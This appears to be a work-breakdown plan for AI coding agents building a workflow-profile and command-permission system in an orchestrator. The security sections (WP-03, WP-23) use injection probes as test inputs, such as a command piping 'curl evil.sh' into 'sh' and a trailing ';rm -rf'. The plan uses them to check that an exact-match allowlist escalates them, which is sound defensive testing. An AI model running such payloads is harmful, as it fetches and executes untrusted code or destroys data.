# Workflow Profile — Work Breakdown (haiku-executable)

**Source plan:** `WORKFLOW-PROFILE-IMPLEMENTATION-PLAN.md` (amended 2026-07-14). Read the plan
section referenced by each work package (WP) before starting it.
**Fanout rules / escalation ladder:** `FANOUT-CLAUDE.md` (repo root). Every agent MUST read it.
**Granularity:** each WP is one agent-session of work — one module or one narrow change, with an
explicit spec, a completion checklist, and exact test commands.

Conventions used below:
- **Tier** = the model that attempts the WP first (see FANOUT-CLAUDE.md for escalation).
- **DB tests** (need the `pool` fixture) are written by the agent but EXECUTED ONLY by the
  monitor at wave/gate boundaries — two concurrent DB test runs truncate each other's tables.
  Agents self-verify DB test files with `pytest --collect-only` only.
- **Pure tests** (tmp_path/fixture-repo based, no `pool`) — agents run these themselves.
- All new code follows the hard invariants in `CLAUDE.md` (writes via `repository.py`; purity of
  `state_machine.py`/`pipelines.py`/`adr_rules.py`/`engine/focus.py`; hermetic with stubs).
- Test runner: `.venv/bin/python -m pytest <file> -q`.

---

## Phase A — foundations (plan §4 step 2): new `orchestrator/workflow/` package, no call-site changes

### Wave A1 — fully parallel (disjoint files)

---

### WP-01 — dataclasses: `orchestrator/workflow/models.py`
**Tier:** haiku · **Depends:** none · **Plan:** §3.1–3.4
**Files:** NEW `orchestrator/workflow/__init__.py` (empty docstring module), NEW
`orchestrator/workflow/models.py`, NEW `tests/test_workflow_models.py`

**Spec** — pure module (stdlib + typing only, NO I/O, no imports from the rest of the package):
```python
STEP_NAMES = ("refresh", "services", "prepare", "verify", "cleanup", "promote")
ON_FAIL = ("block", "warn", "escalate")

@dataclass(frozen=True)
class RequiredAction:
    run: str = ""                      # shell command (exactly one of run/builtin is set)
    builtin: str = ""                  # named adapter action, e.g. "node-deps-reconcile"
    when_changed: tuple[str, ...] = () # globs relative to worktree root
    sentinel: str = ""                 # sentinel file name (stored under <gitdir>/orch/)
    on_fail: str = "block"
    timeout: int = 300                 # seconds
    source: str = "default"            # provenance: default | repo | workspace

@dataclass(frozen=True)
class WorkflowStep:
    name: str
    actions: tuple[RequiredAction, ...] = ()                      # role-agnostic
    by_role: dict[str, tuple[RequiredAction, ...]] = field(default_factory=dict)
    def actions_for(self, role: str | None) -> tuple[RequiredAction, ...]:
        # role match wins; otherwise the role-agnostic list
        ...

@dataclass(frozen=True)
class Profile:
    stack: str = ""                    # node | python | go | rust | "" (undetected)
    services: tuple[str, ...] = ()
    steps: dict[str, WorkflowStep] = field(default_factory=dict)
    def step(self, name: str) -> WorkflowStep: ...   # returns empty WorkflowStep if absent

def validate(profile: Profile) -> list[str]:
    """Return human-readable problems: unknown step name, action with both run and
    builtin set (or neither), bad on_fail value, timeout <= 0."""
```

**Checklist:**
- [ ] Module is pure (verify: no `subprocess`/`os`/`pathlib` I/O calls, no package-internal imports)
- [ ] `actions_for` returns role list when present, else role-agnostic list, else `()`
- [ ] `validate` catches all four problem classes listed above
- [ ] Tests cover: role fallback, both/neither run+builtin, unknown step name, frozen immutability

**Tests (pure — run yourself):** `.venv/bin/python -m pytest tests/test_workflow_models.py -q`

---

### WP-02 — gitdir resolution + `when_changed`/sentinel evaluator: `orchestrator/workflow/sentinel.py`
**Tier:** haiku · **Depends:** none · **Plan:** §3.2 "Sentinel placement (hard rule)"
**Files:** NEW `orchestrator/workflow/sentinel.py`, NEW `tests/test_workflow_sentinel.py`
**Read first:** `orchestrator/apply/npm_deps.py` (the hash trick being generalized)

**Spec:**
```python
def resolve_gitdir(worktree: str | Path) -> Path:
    """Real gitdir of a checkout. <wt>/.git is a DIRECTORY in a primary clone but a
    FILE in a linked worktree ('gitdir: /abs/path' one-liner) — handle both.
    Raise ValueError if neither exists."""

def sentinel_path(worktree, name) -> Path:      # <gitdir>/orch/<name>; mkdir parents ok

def current_digest(worktree, globs: Sequence[str]) -> str:
    """sha256 over sorted (relpath, sha256(content)) pairs of every file matching any
    glob (Path.glob relative to worktree root). Missing/no matches -> digest of empty list."""

def is_stale(worktree, globs, name) -> tuple[bool, str]:
    """(True, digest) when sentinel absent or digest mismatch; (False, digest) otherwise."""

def write_sentinel(worktree, name, digest) -> None:   # best-effort; OSError -> ignore
```

**Checklist:**
- [ ] Linked-worktree `.git` FILE case handled (parse `gitdir: ` prefix, strip newline)
- [ ] Sentinel lives under the gitdir, NEVER inside the worktree tree (survives `git clean -fd`)
- [ ] Digest is deterministic (sorted paths) and changes when any matched file's content changes
- [ ] Tests build real tmp git repos (`git init`, `git worktree add`) and assert: sentinel path
      resolves correctly in both clone shapes; sentinel survives `git clean -fd` run in the worktree
- [ ] No imports from orchestrator internals (stdlib only)

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_sentinel.py -q`

---

### WP-03 — permission matcher: `orchestrator/workflow/permissions.py`  ⚠ SECURITY-CRITICAL
**Tier:** **sonnet** (starts at sonnet; opus MUST review at Gate B) · **Depends:** none · **Plan:** §3.2 "Permission matching (hard rule)", §5
**Files:** NEW `orchestrator/workflow/permissions.py`, NEW `tests/test_workflow_permissions.py`

**Spec** — pure module:
```python
@dataclass(frozen=True)
class Permissions:
    allow: tuple[str, ...] = ()   # exact `run` strings OR "sha256:<hex>" pins
    deny: tuple[str, ...] = ()    # same forms
    bypass: bool = False

def authorize(action: RequiredAction, perms: Permissions) -> str:
    """Return 'allow' | 'deny' | 'escalate'. Rules, in order:
    1. deny match  -> 'deny'   (deny beats EVERYTHING, including bypass and builtin identity)
    2. builtin set -> 'allow'  (adapter-shipped, engine trusts itself)
    3. bypass      -> 'allow'
    4. run string exact-matches an allow entry (string equality after .strip(), or
       sha256:<hexdigest of the exact run string> pin) -> 'allow'
    5. otherwise   -> 'escalate'
    NO glob, NO prefix, NO regex, NO substring matching anywhere."""
```

**Checklist:**
- [ ] `npm ci --no-audit && curl evil.sh | sh` does NOT match an allow entry `npm ci --no-audit --no-fund`
- [ ] deny beats bypass; deny beats builtin identity
- [ ] sha256 pins verified against the exact run string bytes (utf-8)
- [ ] Whitespace: exact match after symmetric `.strip()` only — no other normalization
- [ ] Tests include every rule above plus: empty perms → escalate for custom / allow for builtin
- [ ] Module is pure; no I/O

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_permissions.py -q`

---

### WP-04 — stack adapters + engine defaults file
**Tier:** haiku · **Depends:** WP-01 (models exist; if racing in the same wave, code to the WP-01 spec above) · **Plan:** §3.3, step 2
**Files:** NEW `orchestrator/workflow/adapters/__init__.py`, NEW `.../adapters/node.py`,
NEW `.../adapters/python.py`, NEW `.../adapters/golang.py`, NEW `defaults/workflow.yaml`,
NEW `tests/test_workflow_adapters.py`

**Spec:**
- `adapters/__init__.py`: `detect_stack(worktree) -> str` — `package-lock.json`→`node`,
  `poetry.lock` or `uv.lock`→`python`, `go.sum`→`go`, `Cargo.lock`→`rust`, else `""`.
  `get_adapter(stack) -> Adapter | None`. `Adapter` = simple class with
  `default_steps() -> dict[str, WorkflowStep]` and `builtins() -> dict[str, callable]`
  (name → `fn(worktree) -> dict` with at least `ok: bool`, `reason: str`).
- `node.py`: builtin `node-deps-reconcile` wraps
  `orchestrator.apply.npm_deps.ensure_deps_current` (import it; do not copy). Default steps:
  `prepare` = [builtin node-deps-reconcile (on_fail escalate)],
  `verify` = [run `npm run typecheck && npm test`, on_fail block, timeout 300],
  `cleanup` = [run `git reset --hard && git clean -fd`] — NEVER `-x`.
- `python.py` / `golang.py`: stubs — `default_steps()` returns `{}` for now (filled in WP-21).
- `defaults/workflow.yaml`: YAML rendering of the node defaults above (this file is the
  human-readable baseline; the loader in WP-06 reads it). Keys mirror §3.4's shape.

**Checklist:**
- [ ] `detect_stack` covers all four lockfiles + returns `""` on none
- [ ] node `verify` default is byte-identical to today's fallback: `npm run typecheck && npm test`
- [ ] `cleanup` contains no `-x` anywhere (grep the file)
- [ ] `defaults/workflow.yaml` parses (test loads it with `yaml.safe_load`)
- [ ] Tests: detection matrix (tmp dirs with each lockfile), node defaults shape

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_adapters.py -q`

---

### WP-05 — pure merge logic: `orchestrator/workflow/merge.py`
**Tier:** haiku · **Depends:** WP-01 spec · **Plan:** §2.1 precedence, step 2 "Merge semantics"
**Files:** NEW `orchestrator/workflow/merge.py`, NEW `tests/test_workflow_merge.py`

**Spec** — pure functions over plain dicts (parsed YAML), returning a `Profile`:
```python
def parse_profile_dict(raw: dict, source: str) -> dict
    """Normalize one layer: step -> list[action-dict] OR step -> {role: list[action-dict]};
    stamp every action's `source`. Reject (raise ProfileError) on unknown step names or
    invalid action shape — the CALLER decides fail-safe behavior, not this module."""

def merge_layers(defaults: dict, repo: dict | None, workspace: dict | None) -> Profile
    """Later layer that defines a step REPLACES that step's entire value (including its
    role map) — no deep list merging. `stack`/`services` scalar keys: last-writer wins.
    A `permissions:` key in the REPO layer is IGNORED and recorded in
    Profile-level warnings list (loader surfaces it; doctor flags it)."""
```
Add `warnings: tuple[str, ...] = ()` to `Profile` in models.py if not present (coordinate: WP-01
already merged by the time wave A2 runs; this WP may add the field).

**Checklist:**
- [ ] Per-step REPLACE proven by test: repo defines `prepare` with 1 action → default's 2 actions gone
- [ ] Role-scoped step in overlay replaces role-agnostic step in base (and vice versa)
- [ ] Repo-layer `permissions:` ignored + warning recorded (§5 — repo can never self-authorize)
- [ ] Workspace layer wins over repo on the same step and on scalars
- [ ] Unknown step name in any layer raises `ProfileError` (fail-safe handled by loader, WP-06)
- [ ] Pure — no file I/O in this module

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_merge.py -q`

---

### Wave A2 — after A1 merges

---

### WP-06 — loader + config keys: file discovery, fail-safe, instance flag
**Tier:** **sonnet** · **Depends:** WP-01, WP-04, WP-05 · **Plan:** §2.1, step 2
**Files:** NEW `orchestrator/workflow/loader.py`, EDIT `orchestrator/config.py`,
EDIT `config/instances.example.yaml` (document the new keys), NEW `tests/test_workflow_loader.py`
**Read first:** `orchestrator/config.py` `_resolve_instance` + `load_settings` (lines ~248–345)

**Spec:**
- `config.py`: two new Settings fields — `workspace_manifest: str = ""` and
  `workflow_profile: str = "legacy"` (`enabled | legacy`) — picked up from the instance
  `settings:` block exactly like `verify_worktrees` is (follow the existing `pick`/`pick_dict`
  pattern; env overrides `WORKSPACE_MANIFEST` / `WORKFLOW_PROFILE`).
- `loader.py`:
```python
def load_effective(settings, worktree, role=None) -> Profile:
    """defaults/workflow.yaml (engine install dir — resolve relative to this package,
    not CWD) → <worktree-repo-root>/.orchestrator/workflow.yaml (if present)
    → settings.workspace_manifest file (if configured and present).
    Auto-detect stack via adapters.detect_stack when no layer sets it; apply the
    detected adapter's default_steps() as part of the defaults layer.
    FAIL-SAFE: a ProfileError/yaml error/OSError in the repo or workspace layer →
    log a warning into Profile.warnings, SKIP that layer, continue — a bad config
    file must never wedge verify. A broken engine defaults file is a hard error."""
```
- No call sites change in this WP.

**Checklist:**
- [ ] `defaults/workflow.yaml` located relative to the installed package (works from any CWD)
- [ ] Repo layer read from `<worktree>/.orchestrator/workflow.yaml` only when file exists
- [ ] Malformed repo profile → defaults still returned + warning present (test with junk YAML)
- [ ] Malformed workspace manifest → same fail-safe (test)
- [ ] `workspace_manifest`/`workflow_profile` reach Settings from an instance `settings:` block
      (test via `monkeypatch` + a temp instances drop-in, mirroring existing config tests)
- [ ] Auto-detect fires only when no layer set `stack`
- [ ] Existing full test suite untouched by config change (monitor verifies at gate)

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_loader.py -q`

---

### WP-07 — step runner: `orchestrator/workflow/runner.py` (no escalation persistence yet)
**Tier:** **sonnet** · **Depends:** WP-01..WP-06 · **Plan:** §3.2, step 2
**Files:** NEW `orchestrator/workflow/runner.py`, NEW `tests/test_workflow_runner.py`

**Spec:**
```python
@dataclass
class ActionResult: action; verdict; ok: bool; skipped: str = ""; detail: dict = ...
@dataclass
class StepResult:
    status: str          # "ok" | "failed" | "blocked_on_approval"
    results: list[ActionResult]
    reason: str = ""

def run_step(worktree, profile, step_name, role, perms, *, event_cb=None) -> StepResult:
    """For each action in profile.step(step_name).actions_for(role):
    1. verdict = permissions.authorize(action, perms)
       - deny -> ActionResult(ok=False, verdict='deny'); StepResult failed (reason names action)
       - escalate -> in THIS WP: StepResult('blocked_on_approval') immediately (persistence
         lands in WP-12; leave a clearly-marked hook point `_on_escalate(action)`)
    2. when_changed set and not sentinel.is_stale(...) -> skipped='unchanged', continue
    3. builtin -> adapter builtin fn; run -> subprocess.run(shell=True, cwd=worktree,
       capture_output, timeout=action.timeout)
    4. failure honors on_fail: block -> StepResult failed now; warn -> record, continue
    5. success + sentinel -> write_sentinel(new digest)
    event_cb(kind: str, payload: dict) fires per action outcome (executed/refused/escalated/
    skipped/failed) — caller wires it to repository.append_log (WP-08); runner itself
    imports NOTHING from repository (keeps package DB-free)."""
```

**Checklist:**
- [ ] deny/blocked/failed/warn/skip paths all covered by tests (fake commands: `true`, `false`,
      `touch marker`, a sleeping command for timeout)
- [ ] Sentinel written ONLY after the action succeeds
- [ ] Timeout produces failed ActionResult, not an exception
- [ ] `event_cb` fired once per action with a JSON-safe payload; runner has no repository import
- [ ] `blocked_on_approval` short-circuits the step (later actions not run)

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_runner.py -q`

**GATE A (monitor + opus):** opus QA review of Phase A diff (WP-03 matcher gets line-by-line
review); monitor runs full DB suite. Green before Phase B.

---

## Phase B — call-site cutover behind the flag (plan §4 step 2 end)

### WP-08 — rewire `verify_run` behind `workflow_profile: enabled`
**Tier:** **sonnet** · **Depends:** Gate A · **Plan:** step 2 rewire, §6
**Files:** EDIT `orchestrator/mcp_server/tools_issues.py` (verify_run, ~line 518–600),
NEW/EDIT `tests/test_workflow_cutover.py`
**Read first:** the current `verify_run` body INCLUDING the step-1 `ensure_deps_current` block

**Spec:** when `settings.workflow_profile == "enabled"`: after the existing checkout, call
`load_effective(settings, wt, role="qa")` + build `Permissions` from the workspace manifest
(loader exposes it) and `run_step(prepare)` then `run_step(verify)`, wiring `event_cb` to
`repo.append_log(pool, issue_id, ...)` with the same payload conventions the step-1 code uses
(`deps_reinstalled`, `tests_run` with `machine: True`, `_agent_stamp`). `blocked_on_approval` →
return `{"passed": None, "status": "blocked_on_approval", "reason": ...}` (WP-13 finishes the
downstream semantics). When `legacy` (default): the current code path runs UNCHANGED.

**Checklist:**
- [ ] `legacy` path byte-identical (no behavior change with the flag unset — the default)
- [ ] `enabled` path emits the same event kinds the legacy path does for the same outcomes
- [ ] `blocked_on_approval` never recorded as a failed `tests_run` event
- [ ] `verify_cmd` fallback now comes from the effective profile, not the inline literal
- [ ] DB test written for both flag values (collect-only self-check; monitor executes)

**Tests:** pure parts in `tests/test_workflow_cutover.py`; DB tests monitor-run at Gate B.

---

### WP-09 — rewire `_apply_in_worktree` (same pattern as WP-08)
**Tier:** haiku · **Depends:** WP-08 merged (copy its pattern) · **Plan:** step 2
**Files:** EDIT `orchestrator/apply/worktree.py` (`_apply_in_worktree`), EDIT `tests/test_apply.py` (extend)

**Checklist:**
- [ ] `legacy` path unchanged; `enabled` runs `prepare`+`verify` via `run_step`
- [ ] Return dict keeps existing keys (`passed`, `branch`, `commit`, `deps`) so callers unchanged
- [ ] `blocked_on_approval` propagated as `{"passed": None, "status": "blocked_on_approval"}`
- [ ] Existing `test_apply.py` tests still pass unmodified (legacy default)

**Tests:** extend `tests/test_apply.py` (DB/pool-based → monitor executes; self-check collect-only).

---

### WP-10 — npm sentinel migrates to the gitdir
**Tier:** haiku · **Depends:** WP-02 · **Plan:** §3.2 hard rule, step 2 last bullet
**Files:** EDIT `orchestrator/apply/npm_deps.py`, EDIT/NEW `tests/test_npm_deps.py`

**Spec:** `ensure_deps_current` stores its hash at `sentinel.sentinel_path(wt, "orch-lock-hash")`
instead of `node_modules/.orch-lock-hash`. Back-compat: if the old in-tree sentinel exists and
matches, honor it once, then write the new location (no gratuitous reinstall on upgrade).

**Checklist:**
- [ ] New sentinel under `<gitdir>/orch/`; old location no longer written
- [ ] Upgrade path: existing old sentinel prevents a spurious reinstall (test)
- [ ] Docstring updated (it currently documents the node_modules location)
- [ ] Tests use a tmp git repo + fake lockfile; no npm invoked (monkeypatch `subprocess.run`)

**Tests (pure):** `.venv/bin/python -m pytest tests/test_npm_deps.py -q`

**GATE B (monitor + opus):** opus reviews Phase B diff; monitor runs FULL suite + stub E2E smoke
(register dev+qa → add-goal → `run --max-ticks 50` → all done) with flag `legacy`, then a targeted
enabled-flag verify test. Green before Phase C.

---

## Phase C — gating, persistence, visibility (plan §4 step 3)

### Wave C1 — parallel

### WP-11 — migration 0022 + repository CRUD for pending actions
**Tier:** haiku · **Depends:** Gate B · **Plan:** step 3 "Persistence"
**Files:** NEW `migrations/0022_pending_actions.sql`, EDIT `orchestrator/repository.py`,
EDIT `tests/conftest.py` (ONE line), NEW `tests/test_pending_actions.py`

**Spec — migration (use verbatim):**
```sql
CREATE TABLE pending_actions (
    id BIGSERIAL PRIMARY KEY,
    issue_id BIGINT REFERENCES issues(id) ON DELETE CASCADE,
    worktree TEXT NOT NULL,
    step TEXT NOT NULL,
    action TEXT NOT NULL,                       -- exact resolved run string or builtin name
    action_kind TEXT NOT NULL DEFAULT 'run',    -- run | builtin
    requested_by TEXT NOT NULL DEFAULT '',
    status TEXT NOT NULL DEFAULT 'pending',     -- pending|approved|denied|expired|executed
    resolved_by TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    resolved_at TIMESTAMPTZ,
    expires_at TIMESTAMPTZ NOT NULL DEFAULT now() + interval '24 hours'
);
CREATE INDEX pending_actions_status_idx ON pending_actions (status, expires_at);
```
**Repository functions** (mirror the style of the ADR CRUD around `create_adr`; every write also
appends an `issue_events` entry when `issue_id` is set):
`create_pending_action(pool, *, issue_id, worktree, step, action, action_kind, requested_by, ttl_hours=24)`
(event `action_escalated`) · `list_pending_actions(pool, status="pending")` — FIRST lazily expires
overdue pending rows (`status='expired'`, event `action_expired`) · `resolve_pending_action(pool,
action_id, status, resolved_by)` — only from `pending`, only to `approved|denied` (events
`action_approved`/`action_denied`) · `find_approved_action(pool, issue_id, step, action)` ·
`consume_approved_action(pool, action_id)` → `executed` (event `action_executed`). One-shot
semantics: an approval unblocks exactly one run (plan §2.2).

**Checklist:**
- [ ] `pending_actions` ADDED to the `_clean_db` TRUNCATE list in `tests/conftest.py` (line ~42)
- [ ] Every status transition emits its issue_events kind (list above — 5 kinds)
- [ ] Invalid transition (resolve a non-pending row) raises ValueError
- [ ] Lazy expiry proven by test (insert with past `expires_at` → list flips it + event)
- [ ] `.venv/bin/python -m orchestrator.cli migrate` applies 0022 cleanly (monitor verifies)

**Tests (DB):** `tests/test_pending_actions.py` — collect-only self-check; monitor executes.

### WP-16 — CLI `orchestrator workflow explain`
**Tier:** haiku · **Depends:** Gate B (loader exists) · **Plan:** step 3
**Files:** EDIT `orchestrator/cli.py`, NEW `tests/test_workflow_explain.py`
**Read first:** an existing simple subcommand + parser registration in `cli.py` (e.g. `doctor`, ~line 1201)

**Spec:** `orchestrator workflow explain --instance X [--team T]` → loads settings for the
instance, resolves the team's worktree (from `verify_worktrees` when present, else CWD), prints
each step's resolved actions one per line:
`<step> [<role>] <allow|deny|escalate> [<source>] <run-or-builtin>` plus any `Profile.warnings`.
Exit 0; exit 2 when any action would `deny` or the profile has warnings (lintable in CI).

**Checklist:**
- [ ] Provenance (`default|repo|workspace`) shown per action
- [ ] Authorization verdict shown per action (uses WP-03 matcher + workspace perms)
- [ ] Warnings (e.g. repo-layer `permissions:` ignored) printed
- [ ] Exit codes as specced; test drives `main([...])` with a fixture repo (no DB needed)

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_explain.py -q`

### WP-17 — `orchestrator doctor` workflow lints
**Tier:** haiku · **Depends:** Gate B · **Plan:** step 3
**Files:** EDIT `orchestrator/cli.py` (`_run_doctor_checks`, ~line 794), EDIT `tests/test_onboarding.py` (extend)

**Spec:** add checks (warn-level unless noted): unknown step name in effective profile;
action with both/neither `run`/`builtin`; custom action that would `escalate` (info: "will
require approval"); `workflow_profile: enabled` but `workspace_manifest` unset/missing (FAIL);
repo profile contains `permissions:` (FAIL — self-authorization attempt); stack has no adapter.

**Checklist:**
- [ ] All six lints implemented + one test each
- [ ] Follows the existing check tuple/report format in `_run_doctor_checks`
- [ ] `doctor` on this repo (no profile, flag legacy) stays green

**Tests:** extend existing doctor tests (pure parts runnable; DB parts monitor-run).

### Wave C2 — after C1

### WP-12 — runner escalation persistence + comms
**Tier:** **sonnet** · **Depends:** WP-07, WP-11 · **Plan:** step 3
**Files:** EDIT `orchestrator/workflow/runner.py`, NEW `orchestrator/workflow/escalation.py`,
EDIT `tests/test_workflow_runner.py`

**Spec:** `escalation.py` owns the DB-touching glue so `runner.py` stays repository-free:
`handle_escalation(pool, issue_id, worktree, step, action, requested_by) -> str` —
(a) `find_approved_action` match → `consume_approved_action` → return `"approved"` (runner
executes it); (b) an identical `pending` row exists → return `"pending"` (no duplicate row);
(c) else `create_pending_action` + `repo.create_message(to_team="orchestration", priority="high",
subject="Action approval needed: ...")` → `"pending"`. `run_step` gains an optional
`escalation_cb(action) -> str` hook; verify_run/_apply pass a partial of `handle_escalation`.

**Checklist:**
- [ ] Approved row consumed exactly once (second run without new approval re-escalates)
- [ ] No duplicate pending rows for the same (issue, step, action)
- [ ] Message to `orchestration` team created on first escalation only
- [ ] Runner still importable/testable without a DB (hook optional)

**Tests:** runner tests stay pure (stub the cb); escalation DB tests into
`tests/test_pending_actions.py` (monitor executes).

### WP-13 — `blocked_on_approval` end-to-end semantics  ⚠ STATE-MACHINE ADJACENT
**Tier:** **sonnet** (escalate to opus on first failed attempt) · **Depends:** WP-08, WP-09, WP-12 · **Plan:** §2.2 amendment
**Files:** EDIT `orchestrator/mcp_server/tools_issues.py`, EDIT `orchestrator/apply/worktree.py`,
possibly EDIT `orchestrator/engine/` observe path, NEW `tests/test_blocked_on_approval.py`
**Read first:** how `verify_run`'s result feeds gate decisions (grep `tests_run` consumers;
`state_machine.apply_gate_decision`); plan §2.2 "Escalation must never read as failure"

**Spec:** a `blocked_on_approval` outcome must (1) NOT append a failed `tests_run` event —
append `action_escalated` context instead (WP-11/12 already write the row + event); (2) surface
in the MCP return so a pull worker knows to heartbeat + re-poll rather than `gate_decision` fail;
(3) leave the issue's state untouched (not attempted). After approval, the next `verify_run`
call proceeds normally (WP-12 consume path). `state_machine.py` MUST STAY PURE — if it needs to
know anything, pass data in; do not add I/O.

**Checklist:**
- [ ] No `tests_run` failure event on escalate (event log inspected in test)
- [ ] Issue state unchanged after a blocked verify (test via repository)
- [ ] Approve → next verify_run executes the action and completes (integration test)
- [ ] Deny → verify_run returns a real failure with the deny reason (this one IS a failure)
- [ ] `state_machine.py` diff is empty or pure

**Tests (DB):** `tests/test_blocked_on_approval.py` — monitor executes.

### WP-15 — dashboard `/actions` approval queue
**Tier:** **sonnet** · **Depends:** WP-11 · **Plan:** step 3 "Dashboard approval card"
**Files:** EDIT `orchestrator/dashboard/app.py`, EDIT `orchestrator/dashboard/templates.py`,
EDIT `tests/test_dashboard.py` (extend)
**Read first:** the `/adrs` review-queue implementation in both files — mirror it exactly

**Spec:** GET `/actions` lists pending rows (issue link, step, exact command, requested_by, age,
expires-in); POST approve/deny → `repository.resolve_pending_action`. Same auth/style as `/adrs`.

**Checklist:**
- [ ] Approve + deny round-trip through repository (never raw SQL in the dashboard)
- [ ] Exact resolved command displayed verbatim (no truncation of the string that gets trusted)
- [ ] Expired rows not actionable
- [ ] Tests mirror existing `/adrs` dashboard tests

**Tests (DB):** extend `tests/test_dashboard.py` — monitor executes.

**GATE C (monitor + opus):** opus reviews Phase C (WP-12/13 get the deep review); monitor runs
full suite + a scripted approval-flow walkthrough (escalate → card → approve → re-verify green).

---

## Phase D — services, cleanup, generated docs (plan §4 step 4)

### WP-18 — service readiness probes (probe-only)
**Tier:** haiku · **Depends:** Gate C · **Plan:** step 4
**Files:** EDIT `orchestrator/workflow/adapters/__init__.py` (+node.py), NEW `tests/test_workflow_services.py`

**Spec:** builtin `probe-tcp` — action shape `{builtin: probe-tcp, args: "mongo=localhost:27017"}`
(models: add optional `args: str = ""` to RequiredAction). `services: [mongo, redis]` in a profile
expands (in the loader) to a `services` step of probe-tcp actions with per-service defaults
(mongo 27017, redis 6379, s3-mock 9000), overridable via the workspace manifest
(`service_endpoints: {mongo: "host:port"}`). Probe = `socket.create_connection` with 3s timeout;
failure → on_fail `escalate`. The engine NEVER starts a service.

**Checklist:**
- [ ] Probe success/failure tested against a listening socket opened by the test itself
- [ ] Workspace endpoint override wins over the default port
- [ ] No subprocess/service-start code anywhere in the diff
- [ ] Loader expansion of `services:` covered by a merge/loader test

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_services.py -q`

### WP-19 — wire `cleanup` step at the call sites
**Tier:** haiku · **Depends:** Gate C · **Plan:** step 4
**Files:** EDIT `orchestrator/mcp_server/tools_issues.py`, EDIT `orchestrator/apply/worktree.py`

**Spec:** under `enabled`, the existing inline reset/clean invocations route through
`run_step(cleanup)` (default action `git reset --hard && git clean -fd`). Legacy path untouched.

**Checklist:**
- [ ] No `-x` reachable from any default or example profile (grep whole diff + defaults file)
- [ ] Legacy flag value leaves current cleanup code untouched
- [ ] Sentinels demonstrably survive cleanup (reuse WP-02's surviving-clean test against run_step)

**Tests:** extend `tests/test_workflow_cutover.py`.

### WP-20 — dev-prompt reconcile line generated FROM the profile
**Tier:** **sonnet** · **Depends:** Gate C · **Plan:** step 4
**Files:** EDIT `orchestrator/agent_docs.py`, EDIT `tests/test_agent_docs.py`
**Read first:** `_SYNC_STEP["dev"]` (the step-1 hardcoded npm ci sentence) + the render/drift-check flow

**Spec:** the reconcile sentence in the dev sync step is rendered from the effective profile's
`prepare` actions (e.g. "if the merge changed `package-lock.json`, run `npm ci --no-audit
--no-fund` before typecheck") instead of the hardcoded string; falls back to the current static
text when the flag is `legacy` or no profile resolves. Respect the generated-docs drift check —
regenerate via `render-agent-docs` and note the required commit in the WP report.

**Checklist:**
- [ ] Rendered sentence derives from profile actions (change the profile in a test → sentence changes)
- [ ] `legacy` output byte-identical to today's docs (drift check green without regeneration)
- [ ] Drift check passes after regeneration on `enabled`

**Tests:** extend `tests/test_agent_docs.py` (pure parts runnable by agent).

**GATE D (monitor + opus):** review + full suite + drift check.

---

## Phase E — second stack, bug fix, conclusion tests (plan §4 step 5, §8.6)

### WP-21 — python adapter end-to-end
**Tier:** haiku · **Depends:** Gate D · **Plan:** step 5
**Files:** EDIT `orchestrator/workflow/adapters/python.py`, EDIT `tests/test_workflow_adapters.py`,
NEW fixture usage in `tests/test_workflow_second_stack.py`

**Spec:** defaults — `prepare`: `uv sync --frozen` when `uv.lock` (fallback `poetry install --sync`
when `poetry.lock`), `when_changed: [uv.lock]`/`[poetry.lock]`, `sentinel: py-lock-hash`,
on_fail escalate; `verify`: `python -m pytest -q` (on_fail block); `cleanup`: same git default.
Second-stack test: a tmp git fixture repo with `uv.lock` + FAKE commands (profile overrides
`run:` to `touch`/`false` markers) runs `refresh(prepare→verify→cleanup)` through the SAME
`run_step` path with zero engine changes — that is the acceptance criterion of plan step 5.

**Checklist:**
- [ ] Auto-detect picks python from the fixture's lockfile
- [ ] Reconcile fires only on lockfile change (sentinel test, same shape as node's)
- [ ] Whole flow runs with fake commands — no uv/poetry/network needed (hermetic)
- [ ] Zero non-test engine files changed except `python.py`

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_second_stack.py tests/test_workflow_adapters.py -q`

### WP-22 — `create_adr` domain case-normalization (plan risk 6, REDIAGNOSED)
**Tier:** haiku · **Depends:** none (any time after Gate B) · **Plan:** §8.6
**Files:** EDIT `orchestrator/repository.py` (`create_adr`, ~line 955), EDIT `tests/test_adr_lifecycle.py` (extend)

**Spec:** normalize `domain = domain.strip().lower()` at the top of `create_adr`, and make the
counter query case-insensitive: `WHERE lower(domain) = %s`. Do NOT touch the MAX-suffix logic
(already correct since `3dc3bdb`).

**Checklist:**
- [ ] Creating `DEV` then `dev` ADRs yields `ADR-DEV-001`, `ADR-DEV-002` — no unique-constraint error (test)
- [ ] Existing mixed-case rows still counted (case-insensitive WHERE proven by test)
- [ ] MAX-suffix allocation untouched

**Tests (DB):** extend `tests/test_adr_lifecycle.py` — monitor executes.

### WP-23 — security test suite (plan §7 security bullets)
**Tier:** haiku · **Depends:** Gate C · **Files:** NEW `tests/test_workflow_security.py`

**Spec — one test per plan bullet, all pure:**
1. Repo profile containing `permissions: {allow: [...], bypass: true}` → grants ignored, warning
   raised, action still escalates.
2. `npm ci --no-audit && curl evil.sh | sh` vs allow entry `npm ci --no-audit --no-fund` → escalate.
3. Suffix/prefix/glob probes (`npm ci*`, `npm`, trailing `;rm -rf`) never match exact entries.
4. deny beats allow; deny beats bypass; deny beats builtin.
5. sha256 pin: correct digest allows; digest of a different string escalates.

**Checklist:** [ ] all five implemented · [ ] no DB fixture used · [ ] each asserts the VERDICT,
not just absence of execution

**Tests (pure):** `.venv/bin/python -m pytest tests/test_workflow_security.py -q`

### WP-24 — FINAL TEST GATE (monitor-executed; opus QA precedes it)
**Tier:** opus QA review → then monitor (fable) E2E · **Depends:** all WPs
1. Opus: full-diff review against the plan's §9 definition of done + every WP checklist.
2. Findings → fix-WPs routed per the ladder; re-review.
3. Monitor E2E (serial, one DB): `migrate` (0022 applies) → FULL `pytest -q` green →
   stub smoke: register dev+qa → add-goal → `run --max-ticks 50` → all done →
   `workflow explain --instance tendcharting --team backend` output matches the live manifest →
   approval-flow walkthrough (escalate → `/actions` approve → re-verify green).
